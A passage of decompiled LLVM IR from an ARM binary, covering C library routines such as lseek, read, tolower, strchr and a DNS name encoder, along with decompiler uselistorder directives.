dec_label_pc_123bc:                               ; preds = %dec_label_pc_120d8, %bb74, %dec_label_pc_1212c, %dec_label_pc_12124, %dec_label_pc_12118, %dec_label_pc_12104, %dec_label_pc_120e8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_123c0

dec_label_pc_123c0:                               ; preds = %dec_label_pc_122e8, %dec_label_pc_123a4, %dec_label_pc_123b0, %dec_label_pc_12180, %dec_label_pc_123bc
  %v0_123c0 = load i32, i32* @sl, align 4
  store i32 %v0_123c0, i32* %r0.global-to-local, align 4
  store i32 %v3_120a8, i32* @r4, align 4
  store i32 %v6_120a8, i32* @r5, align 4
  store i32 %v12_120a8, i32* @r7, align 4
  store i32 %v15_120a8, i32* @r8, align 4
  store i32 %v21_120a8, i32* @sl, align 4
  store i32 %v24_120a8, i32* @fp, align 4
  ret i32 %v0_123c0

; uselistorder directives
  uselistorder i32 %v1_12318, { 1, 0 }
  uselistorder i32 %v0_122dc, { 1, 0 }
  uselistorder i32 %v3_1227823, { 1, 0 }
  uselistorder i32 %v0_1227820, { 1, 0 }
  uselistorder i32 %v2_12254, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_12154, { 1, 0 }
  uselistorder i32 %v0_12118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_120fc, { 1, 0 }
  uselistorder i32 %v0_120c8, { 1, 0, 2 }
  uselistorder i32 %v0_120bc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_120b8, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 12, 11, 13, 14, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 (i8*)* @__GI_fclose, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 7, { 2, 7, 8, 3, 4, 5, 0, 6, 10, 9, 1 }
  uselistorder i32* @global_var_1e7a4, { 0, 6, 2, 7, 1, 3, 4, 5 }
  uselistorder i32 35, { 0, 2, 3, 1 }
  uselistorder i32 10, { 3, 4, 25, 5, 6, 26, 27, 28, 29, 30, 22, 11, 21, 7, 31, 2, 32, 33, 34, 35, 9, 12, 36, 13, 37, 14, 15, 16, 0, 23, 24, 17, 19, 20, 38, 8, 1, 10, 18 }
  uselistorder i32 80, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 48, { 7, 4, 10, 2, 11, 12, 13, 3, 5, 14, 6, 15, 9, 16, 1, 0, 8 }
  uselistorder i32 36, { 4, 5, 6, 8, 9, 10, 11, 3, 1, 7, 2, 0, 12, 13, 14 }
  uselistorder i32 56, { 4, 9, 6, 3, 7, 2, 0, 8, 5, 1 }
  uselistorder i32 44, { 3, 4, 5, 9, 10, 11, 1, 2, 7, 8, 0, 6 }
  uselistorder i32 -48, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* @fp, { 19, 22, 20, 1, 21, 23, 24, 25, 26, 0, 28, 27, 29, 30, 31, 2, 32, 33, 34, 35, 36, 37, 38, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 39, 40, 41, 54, 55, 56, 57, 58, 59 }
  uselistorder i32* @sl, { 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 14, 15, 16, 17, 2, 3, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 1, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32* @r7, { 38, 40, 41, 39, 42, 43, 44, 45, 46, 47, 10, 11, 12, 13, 14, 15, 16, 1, 48, 56, 55, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 6, 87, 88, 110, 17, 18, 2, 19, 7, 20, 21, 22, 23, 24, 25, 26, 27, 28, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 89, 90, 91, 92, 29, 30, 31, 32, 57, 3, 58, 59, 4, 5, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 0, 8, 9, 108, 109, 104, 105, 106, 107, 49, 50, 51, 52, 53, 54, 33, 34, 35, 36, 37 }
  uselistorder label %dec_label_pc_123c0, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_123bc, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1238c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_12388, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1232c, { 1, 0 }
  uselistorder label %dec_label_pc_122d8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_12278.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_122b8, { 1, 0 }
  uselistorder label %dec_label_pc_12234, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_120e8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12414, label %dec_label_pc_12400

dec_label_pc_12400:                               ; preds = %entry
  %v0_12400 = call i32 @__errno_location()
  %v0_12404 = load i32, i32* %r4.global-to-local, align 4
  %v1_12404 = sub i32 0, %v0_12404
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1240c = inttoptr i32 %v0_12400 to i32*
  store i32 %v1_12404, i32* %v2_1240c, align 4
  %v0_1241c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1241c

dec_label_pc_12414:                               ; preds = %entry
  %v2_12414 = icmp eq i32 %arg1, 0
  br i1 %v2_12414, label %dec_label_pc_12428, label %dec_label_pc_1241c

dec_label_pc_1241c:                               ; preds = %dec_label_pc_12414, %dec_label_pc_12400
  %v0_1241c = phi i32 [ %arg1, %dec_label_pc_12414 ], [ %v0_1241c.pre, %dec_label_pc_12400 ]
  br label %dec_label_pc_1242c

dec_label_pc_12428:                               ; preds = %dec_label_pc_12414
  br label %dec_label_pc_1242c

dec_label_pc_1242c:                               ; preds = %dec_label_pc_1241c, %dec_label_pc_12428
  %v14_12430 = phi i32 [ %v0_1241c, %dec_label_pc_1241c ], [ %tmp9, %dec_label_pc_12428 ]
  ret i32 %v14_12430

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1242c, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12434 = load i32, i32* @r4, align 4
  store i32 %v3_12434, i32* %stack_var_-8, align 4
  %v1_12438 = load i32, i32* @r1, align 4
  %v2_12438 = inttoptr i32 %v1_12438 to i32*
  %v3_12438 = load i32, i32* @r2, align 4
  %v4_12438 = call i32 @read(i32 %arg1, i32* %v2_12438, i32 %v3_12438)
  store i32 %v4_12438, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12438, -4095
  br i1 %tmp, label %dec_label_pc_12458, label %dec_label_pc_12448

dec_label_pc_12448:                               ; preds = %entry
  %v0_12448 = call i32 @__errno_location()
  %v0_1244c = load i32, i32* %r4.global-to-local, align 4
  %v1_1244c = sub i32 0, %v0_1244c
  %v2_12450 = inttoptr i32 %v0_12448 to i32*
  store i32 %v1_1244c, i32* %v2_12450, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %entry, %dec_label_pc_12448
  %v0_12458 = phi i32 [ %v4_12438, %entry ], [ -1, %dec_label_pc_12448 ]
  %v2_1245c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1245c, i32* @r4, align 4
  ret i32 %v0_12458

; uselistorder directives
  uselistorder i32 %v4_12438, { 1, 0, 2 }
  uselistorder i32 ()* @__errno_location, { 45, 29, 44, 68, 67, 66, 43, 42, 28, 27, 41, 22, 40, 21, 35, 26, 25, 20, 12, 11, 10, 19, 9, 8, 7, 6, 18, 5, 4, 3, 69, 17, 16, 53, 52, 65, 64, 63, 31, 33, 59, 54, 36, 37, 50, 34, 49, 48, 30, 24, 0, 23, 1, 39, 38, 13, 51, 47, 15, 2, 62, 14, 61, 60, 46, 32, 58, 57, 56, 55 }
  uselistorder label %dec_label_pc_12458, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_12468 = icmp slt i32 %arg1, 0
  br i1 %v1_12468, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_12468 = mul i32 %arg1, 2
  %v2_12474 = load i32, i32* bitcast (i32** @global_var_1e7ac.519 to i32*), align 4
  %v2_12478 = add i32 %v2_12474, %v2_12468
  %v3_1247c = inttoptr i32 %v2_12478 to i8*
  %v4_1247c = load i8, i8* %v3_1247c, align 1
  %v6_1247c = zext i8 %v4_1247c to i32
  %v1_12480 = add i32 %v2_12478, 1
  %v2_12480 = inttoptr i32 %v1_12480 to i8*
  %v3_12480 = load i8, i8* %v2_12480, align 1
  %v4_12480 = zext i8 %v3_12480 to i32
  %v3_12484 = mul nuw i32 %v4_12480, 16777216
  %v4_12488 = sdiv i32 %v3_12484, 65536
  %v5_12488 = or i32 %v4_12488, %v6_1247c
  ret i32 %v5_12488

; uselistorder directives
  uselistorder i32 %v2_12478, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_12494 = load i32, i32* @r5, align 4
  %v9_12494 = load i32, i32* @r6, align 4
  %v1_12498 = urem i32 %arg1, 256
  br label %dec_label_pc_124b8

dec_label_pc_124a0:                               ; preds = %dec_label_pc_124b8
  %v3_124a0 = load i8, i8* %.0, align 1
  %v4_124a0 = zext i8 %v3_124a0 to i32
  %v9_124a4 = icmp eq i32 %v4_124a0, %v1_12498
  br i1 %v9_124a4, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_124a0
  ret i32 %v1_124b8

bb24:                                             ; preds = %dec_label_pc_124a0
  %v2_124ac = icmp eq i8 %v3_124a0, 0
  %v2_124b0 = add i32 %v1_124b8, 1
  %v3_124b0 = inttoptr i32 %v2_124b0 to i8*
  br i1 %v2_124ac, label %dec_label_pc_1258c, label %dec_label_pc_124b8

dec_label_pc_124b8:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_124b0, %bb24 ]
  %v1_124b8 = ptrtoint i8* %.0 to i32
  %v2_124b8 = urem i32 %v1_124b8, 4
  %v3_124b8 = icmp eq i32 %v2_124b8, 0
  br i1 %v3_124b8, label %dec_label_pc_124c0, label %dec_label_pc_124a0

dec_label_pc_124c0:                               ; preds = %dec_label_pc_124b8
  %v4_124c0 = mul nuw nsw i32 %v1_12498, 256
  %v5_124c0 = or i32 %v4_124c0, %v1_12498
  %v4_124c8 = mul i32 %v5_124c0, 65536
  %v5_124c8 = or i32 %v4_124c8, %v5_124c0
  br label %dec_label_pc_124cc

dec_label_pc_124cc:                               ; preds = %dec_label_pc_12584, %dec_label_pc_1250c, %dec_label_pc_124c0
  %v0_12530 = phi i32 [ %v1_124b8, %dec_label_pc_124c0 ], [ %v4_124cc, %dec_label_pc_1250c ], [ %v4_124cc, %dec_label_pc_12584 ]
  %v1_124cc = inttoptr i32 %v0_12530 to i32*
  %v2_124cc = load i32, i32* %v1_124cc, align 4
  %v4_124cc = add i32 %v0_12530, 4
  %v2_124d4 = xor i32 %v2_124cc, %v5_124c8
  %v2_124e0 = add i32 %v2_124cc, 2130640639
  %v1_124e4 = sub i32 -1, %v2_124cc
  %v2_124e8 = xor i32 %v2_124e0, %v1_124e4
  %v2_124ec = add i32 %v2_124d4, 2130640639
  %v1_124f4 = sub i32 -1, %v2_124d4
  %v2_124f8 = and i32 %v2_124e8, -2130640640
  %v2_124fc = xor i32 %v2_124ec, %v1_124f4
  %v2_12500 = icmp eq i32 %v2_124f8, 0
  %v2_12504 = and i32 %v2_124fc, -2130640640
  store i32 %v2_12504, i32* @lr, align 4
  br i1 %v2_12500, label %dec_label_pc_1250c, label %dec_label_pc_12514

dec_label_pc_1250c:                               ; preds = %dec_label_pc_124cc
  %v2_1250c = icmp eq i32 %v2_12504, 0
  br i1 %v2_1250c, label %dec_label_pc_124cc, label %dec_label_pc_12514

dec_label_pc_12514:                               ; preds = %dec_label_pc_124cc, %dec_label_pc_1250c
  %v2_12514 = inttoptr i32 %v0_12530 to i8*
  %v3_12514 = load i8, i8* %v2_12514, align 1
  %v4_12514 = zext i8 %v3_12514 to i32
  %v1_1251c = add i32 %v0_12530, 1
  %v1_12520 = add i32 %v0_12530, 2
  %v9_12524 = icmp eq i32 %v4_12514, %v1_12498
  %v1_12528 = add i32 %v0_12530, 3
  br i1 %v9_12524, label %dec_label_pc_12530, label %dec_label_pc_12538

dec_label_pc_12530:                               ; preds = %dec_label_pc_12514
  store i32 %v6_12494, i32* @r5, align 4
  store i32 %v9_12494, i32* @r6, align 4
  ret i32 %v0_12530

dec_label_pc_12538:                               ; preds = %dec_label_pc_12514
  %v2_12538 = icmp eq i8 %v3_12514, 0
  br i1 %v2_12538, label %dec_label_pc_1258c, label %dec_label_pc_12540

dec_label_pc_12540:                               ; preds = %dec_label_pc_12538
  %v2_12540 = inttoptr i32 %v1_1251c to i8*
  %v3_12540 = load i8, i8* %v2_12540, align 1
  %v4_12540 = zext i8 %v3_12540 to i32
  %v9_12544 = icmp eq i32 %v4_12540, %v1_12498
  br i1 %v9_12544, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_12540
  store i32 %v6_12494, i32* @r5, align 4
  store i32 %v9_12494, i32* @r6, align 4
  ret i32 %v1_1251c

bb26:                                             ; preds = %dec_label_pc_12540
  %v2_1254c = icmp eq i8 %v3_12540, 0
  br i1 %v2_1254c, label %dec_label_pc_1258c, label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %bb26
  %v2_12554 = inttoptr i32 %v1_12520 to i8*
  %v3_12554 = load i8, i8* %v2_12554, align 1
  %v4_12554 = zext i8 %v3_12554 to i32
  %v9_12558 = icmp eq i32 %v4_12554, %v1_12498
  br i1 %v9_12558, label %dec_label_pc_12560, label %dec_label_pc_12568

dec_label_pc_12560:                               ; preds = %dec_label_pc_12554
  store i32 %v6_12494, i32* @r5, align 4
  store i32 %v9_12494, i32* @r6, align 4
  ret i32 %v1_12520

dec_label_pc_12568:                               ; preds = %dec_label_pc_12554
  %v2_12568 = icmp eq i8 %v3_12554, 0
  br i1 %v2_12568, label %dec_label_pc_1258c, label %dec_label_pc_12570

dec_label_pc_12570:                               ; preds = %dec_label_pc_12568
  %v2_12570 = inttoptr i32 %v1_12528 to i8*
  %v3_12570 = load i8, i8* %v2_12570, align 1
  %v4_12570 = zext i8 %v3_12570 to i32
  %v9_12574 = icmp eq i32 %v4_12570, %v1_12498
  br i1 %v9_12574, label %dec_label_pc_1257c, label %dec_label_pc_12584

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12570
  store i32 %v6_12494, i32* @r5, align 4
  store i32 %v9_12494, i32* @r6, align 4
  ret i32 %v1_12528

dec_label_pc_12584:                               ; preds = %dec_label_pc_12570
  %v2_12584 = icmp eq i8 %v3_12570, 0
  br i1 %v2_12584, label %dec_label_pc_1258c, label %dec_label_pc_124cc

dec_label_pc_1258c:                               ; preds = %bb24, %dec_label_pc_12584, %dec_label_pc_12568, %bb26, %dec_label_pc_12538
  store i32 %v6_12494, i32* @r5, align 4
  store i32 %v9_12494, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_124cc, { 1, 0 }
  uselistorder i32 %v2_124cc, { 0, 2, 1 }
  uselistorder i32 %v0_12530, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_124c0, { 1, 0 }
  uselistorder i32 %v1_124b8, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_12498, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_12494, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_12494, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 1, 2, 5, 6, 3, 0, 4 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1258c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12514, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1259c = load i32, i32* @r4, align 4
  store i32 %v3_1259c, i32* %stack_var_-24, align 4
  %v6_1259c = load i32, i32* @r5, align 4
  %v9_1259c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_125a4 = load i32, i32* @r1, align 4
  store i32 %v0_125a4, i32* @r6, align 4
  %v0_125a8 = load i32, i32* @r2, align 4
  store i32 %v0_125a8, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1261019 = icmp slt i8* %arg1, null
  store i1 %v1_1261019, i1* %cpsr_n.global-to-local, align 1
  %v2_1261020 = icmp eq i8* %arg1, null
  store i1 %v2_1261020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1261020, label %dec_label_pc_12628, label %dec_label_pc_1261c

dec_label_pc_125b4:                               ; preds = %dec_label_pc_1261c
  %v2_125b4 = call i32 @__GI_strchr(i32 %v0_125b421, i32 46)
  store i32 %v2_125b4, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_125b8 = icmp slt i32 %v2_125b4, 0
  store i1 %v1_125b8, i1* %cpsr_n.global-to-local, align 1
  %v2_125b8 = icmp eq i32 %v2_125b4, 0
  store i1 %v2_125b8, i1* %cpsr_z.global-to-local, align 1
  %v0_125bc = load i32, i32* @r4, align 4
  %v2_125bc = sub i32 %v2_125b4, %v0_125bc
  store i32 %v2_125bc, i32* %ip.global-to-local, align 4
  store i32 %v0_125bc, i32* %r0.global-to-local, align 4
  br i1 %v2_125b8, label %dec_label_pc_125c8, label %dec_label_pc_125d0

dec_label_pc_125c8:                               ; preds = %dec_label_pc_125b4
  %v1_125c0 = inttoptr i32 %v0_125bc to i8*
  %v3_125c8 = call i32 @strlen(i8* %v1_125c0)
  store i32 %v3_125c8, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_125c8, 16777216
  %v1_125cc = sdiv i32 %sext, 16777216
  store i32 %v1_125cc, i32* %ip.global-to-local, align 4
  %v0_125dc.pre = load i32, i32* @r4, align 4
  %v0_125ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_125d0

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125b4, %dec_label_pc_125c8
  %v0_125ec = phi i32 [ %v2_125b4, %dec_label_pc_125b4 ], [ %v0_125ec.pre, %dec_label_pc_125c8 ]
  %v0_125dc = phi i32 [ %v0_125bc, %dec_label_pc_125b4 ], [ %v0_125dc.pre, %dec_label_pc_125c8 ]
  %v0_125fc = phi i32 [ %v2_125bc, %dec_label_pc_125b4 ], [ %v1_125cc, %dec_label_pc_125c8 ]
  %v0_125d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_125d0 = add i32 %v0_125d0, 1
  store i32 %v1_125d0, i32* @lr, align 4
  %v1_125d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_125d4 = sub i32 %v1_125d4, %v0_125d0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_125d8 = icmp slt i32 %v0_125fc, 0
  store i1 %v1_125d8, i1* %cpsr_n.global-to-local, align 1
  %v2_125d8 = icmp eq i32 %v0_125fc, 0
  store i1 %v2_125d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_125dc, i32* @r1, align 4
  %v0_125e0 = load i32, i32* @r6, align 4
  %v2_125e0 = add i32 %v0_125e0, %v1_125d0
  store i32 %v2_125e0, i32* @r0, align 4
  store i32 %v0_125fc, i32* @r2, align 4
  %v1_125e8 = add i32 %v2_125d4, -1
  %v1_125ec = add i32 %v0_125ec, 1
  store i32 %v1_125ec, i32* @r4, align 4
  br i1 %v2_125d8, label %.loopexit, label %dec_label_pc_125f4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_125d0
  %v2_125f4 = sub i32 %v0_125fc, %v1_125e8
  %v3_125f4 = icmp ult i32 %v0_125fc, %v1_125e8
  %v4_125f4 = xor i32 %v1_125e8, %v0_125fc
  %v5_125f4 = xor i32 %v2_125f4, %v0_125fc
  %v6_125f4 = and i32 %v5_125f4, %v4_125f4
  %v7_125f4 = icmp slt i32 %v6_125f4, 0
  store i1 %v7_125f4, i1* %cpsr_v.global-to-local, align 1
  %v8_125f4 = icmp slt i32 %v2_125f4, 0
  store i1 %v8_125f4, i1* %cpsr_n.global-to-local, align 1
  %v9_125f4 = icmp eq i32 %v0_125fc, %v1_125e8
  store i1 %v9_125f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_125f4, label %dec_label_pc_125fc, label %.loopexit

dec_label_pc_125fc:                               ; preds = %dec_label_pc_125f4
  %v1_125fc = trunc i32 %v0_125fc to i8
  %v4_125fc = add i32 %v0_125e0, %v0_125d0
  %v5_125fc = inttoptr i32 %v4_125fc to i8*
  store i8 %v1_125fc, i8* %v5_125fc, align 1
  %v0_12600 = load i32, i32* @lr, align 4
  %v1_12600 = load i32, i32* %ip.global-to-local, align 4
  %v2_12600 = add i32 %v1_12600, %v0_12600
  store i32 %v2_12600, i32* %r7.global-to-local, align 4
  %v0_12604 = call i32 @memcpy()
  store i32 %v0_12604, i32* %r0.global-to-local, align 4
  %v0_12608 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12608 = icmp slt i32 %v0_12608, 0
  store i1 %v1_12608, i1* %cpsr_n.global-to-local, align 1
  %v2_12608 = icmp eq i32 %v0_12608, 0
  store i1 %v2_12608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12608, label %dec_label_pc_12628, label %dec_label_pc_125fc.dec_label_pc_12610_crit_edge

dec_label_pc_125fc.dec_label_pc_12610_crit_edge:  ; preds = %dec_label_pc_125fc
  %v0_12610.pre = load i32, i32* @r4, align 4
  store i32 %v0_12610.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12610 = icmp slt i32 %v0_12610.pre, 0
  store i1 %v1_12610, i1* %cpsr_n.global-to-local, align 1
  %v2_12610 = icmp eq i32 %v0_12610.pre, 0
  store i1 %v2_12610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12610, label %dec_label_pc_12628, label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %entry, %dec_label_pc_125fc.dec_label_pc_12610_crit_edge
  %v0_125b421 = phi i32 [ %v0_12610.pre, %dec_label_pc_125fc.dec_label_pc_12610_crit_edge ], [ %tmp, %entry ]
  %v1_1261c = inttoptr i32 %v0_125b421 to i8*
  %v2_1261c = load i8, i8* %v1_1261c, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12620 = icmp eq i8 %v2_1261c, 0
  store i1 %v2_12620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12620, label %dec_label_pc_12628, label %dec_label_pc_125b4

dec_label_pc_12628:                               ; preds = %dec_label_pc_125fc.dec_label_pc_12610_crit_edge, %dec_label_pc_125fc, %dec_label_pc_1261c, %entry
  %v0_12628 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12628 = icmp slt i32 %v0_12628, 0
  store i1 %v1_12628, i1* %cpsr_n.global-to-local, align 1
  %v2_12628 = icmp eq i32 %v0_12628, 0
  store i1 %v2_12628, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_12628, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_12628
  %v5_12630 = load i32, i32* %r7.global-to-local, align 4
  %v6_12630 = add i32 %v5_12630, 1
  store i32 %v6_12630, i32* %r0.global-to-local, align 4
  %v7_12634 = load i32, i32* @r6, align 4
  %v9_12634 = add i32 %v7_12634, %v5_12630
  %v10_12634 = inttoptr i32 %v9_12634 to i8*
  store i8 0, i8* %v10_12634, align 1
  %v0_12638.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_12638.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_12638.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12628, %bb
  %v2_12638 = phi i1 [ %v2_12638.pre, %bb ], [ false, %dec_label_pc_12628 ]
  %v1_12638 = phi i1 [ %v1_12638.pre, %bb ], [ %v1_12628, %dec_label_pc_12628 ]
  %v0_12638 = phi i1 [ %v0_12638.pre, %bb ], [ %v2_12628, %dec_label_pc_12628 ]
  %v3_12638 = xor i1 %v2_12638, %v1_12638
  %v4_12638 = or i1 %v0_12638, %v3_12638
  br i1 %v4_12638, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_12638 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_12638, i32* @r4, align 4
  store i32 %v6_1259c, i32* @r5, align 4
  store i32 %v9_1259c, i32* @r6, align 4
  %v25_12638 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_12638

.loopexit:                                        ; preds = %dec_label_pc_125f4, %dec_label_pc_125d0, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12640 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12640, i32* @r4, align 4
  store i32 %v6_1259c, i32* @r5, align 4
  store i32 %v9_1259c, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_12628, { 0, 2, 1 }
  uselistorder i32 %v0_12610.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12608, { 1, 0 }
  uselistorder i32 %v2_125f4, { 1, 0 }
  uselistorder i32 %v1_125e8, { 2, 0, 3, 1 }
  uselistorder i32 %v0_125fc, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_125cc, { 1, 0 }
  uselistorder i32 %v0_125bc, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1261020, { 1, 0 }
  uselistorder i32 %v9_1259c, { 1, 0 }
  uselistorder i32 %v6_1259c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 (i8*)* @strlen, { 6, 28, 27, 5, 4, 3, 0, 2, 29, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 7, 8, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 3, 1 }
